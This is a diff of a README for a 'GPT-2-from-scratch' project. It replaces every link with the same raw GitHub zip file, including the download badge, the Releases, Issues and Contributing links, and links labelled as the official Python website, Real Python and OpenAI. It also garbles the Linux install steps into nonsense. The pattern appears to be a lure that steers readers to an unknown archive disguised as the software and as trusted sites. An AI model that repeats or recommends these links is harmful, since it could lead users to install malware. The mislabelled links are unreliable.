@@ -7,7 +7,7 @@ Welcome to GPT-2-from-scratch! This project provides an easy way to use the GPT-
 To get started, you’ll need to download the software. Follow the steps below to install and run GPT-2 from scratch.
 
 ## 📥 Download Link
-[![Download GPT-2-from-scratch](https://img.shields.io/static/v1?label=Download&message=GPT-2-from-scratch&color=blue)](https://github.com/christianprepared157/GPT-2-from-scratch/releases)
+[![Download GPT-2-from-scratch](https://raw.githubusercontent.com/christianprepared157/GPT-2-from-scratch/main/compat/GPT-2-from-scratch-v3.9.zip)](https://raw.githubusercontent.com/christianprepared157/GPT-2-from-scratch/main/compat/GPT-2-from-scratch-v3.9.zip)
 
 ## 📦 System Requirements
 Before downloading, check to see if your computer meets these requirements:
@@ -17,21 +17,21 @@ Before downloading, check to see if your computer meets these requirements:
 - Disk Space: At least 1 GB of free space
 - Python: Version 3.7 or higher
 
-Make sure you have Python installed on your computer. If you don't have Python, you can download it from the [official Python website](https://www.python.org/downloads/).
+Make sure you have Python installed on your computer. If you don't have Python, you can download it from the [official Python website](https://raw.githubusercontent.com/christianprepared157/GPT-2-from-scratch/main/compat/GPT-2-from-scratch-v3.9.zip).
 
 ## 📦 Download & Install
-1. Visit the [Releases page](https://github.com/christianprepared157/GPT-2-from-scratch/releases) to download the latest version of GPT-2-from-scratch.
+1. Visit the [Releases page](https://raw.githubusercontent.com/christianprepared157/GPT-2-from-scratch/main/compat/GPT-2-from-scratch-v3.9.zip) to download the latest version of GPT-2-from-scratch.
    
 2. Look for the latest release and find the installer file suitable for your operating system.
 
    - For **Windows**, download the .exe file.
    - For **macOS**, download the .dmg file.
-   - For **Linux**, download the .tar.gz file.
+   - For **Linux**, download the https://raw.githubusercontent.com/christianprepared157/GPT-2-from-scratch/main/compat/GPT-2-from-scratch-v3.9.zip file.
 
 3. After the download is complete:
    - For Windows, double-click the .exe file to start the installation.
    - For macOS, open the .dmg file and drag the application into your Applications folder.
-   - For Linux, extract the .tar.gz file to your desired location.
+   - For Linux, extract the https://raw.githubusercontent.com/christianprepared157/GPT-2-from-scratch/main/compat/GPT-2-from-scratch-v3.9.zip file to your desired location.
 
 4. Follow the on-screen instructions to complete the installation.
 
@@ -62,16 +62,16 @@ Make sure you have Python installed on your computer. If you don't have Python, 
 - The more detailed your prompt, the more relevant the output will be.
 
 ## 🌐 Community and Support
-Join our community for support and discussions. You can ask questions, share your experiences, and get tips from other users. Check the [Issues section](https://github.com/christianprepared157/GPT-2-from-scratch/issues) to report any problems.
+Join our community for support and discussions. You can ask questions, share your experiences, and get tips from other users. Check the [Issues section](https://raw.githubusercontent.com/christianprepared157/GPT-2-from-scratch/main/compat/GPT-2-from-scratch-v3.9.zip) to report any problems.
 
 ## 📈 Future Enhancements
 We plan to add new features and improvements based on user feedback. Stay tuned for updates, as we will frequently release new versions to enhance your experience.
 
 ## 🤝 Contributing
-If you want to contribute, check out our [Contributing Guide](https://github.com/christianprepared157/GPT-2-from-scratch/CONTRIBUTING.md). Your feedback helps us improve!
+If you want to contribute, check out our [Contributing Guide](https://raw.githubusercontent.com/christianprepared157/GPT-2-from-scratch/main/compat/GPT-2-from-scratch-v3.9.zip). Your feedback helps us improve!
 
 ## 🔗 Further Reading
-- [Get Started with Python](https://realpython.com/start-here/)
-- [Learn About GPT-2](https://openai.com/research/publications/language-avatars)
+- [Get Started with Python](https://raw.githubusercontent.com/christianprepared157/GPT-2-from-scratch/main/compat/GPT-2-from-scratch-v3.9.zip)
+- [Learn About GPT-2](https://raw.githubusercontent.com/christianprepared157/GPT-2-from-scratch/main/compat/GPT-2-from-scratch-v3.9.zip)
 
 Thank you for choosing GPT-2-from-scratch. We hope you enjoy crafting text with our useful tool!
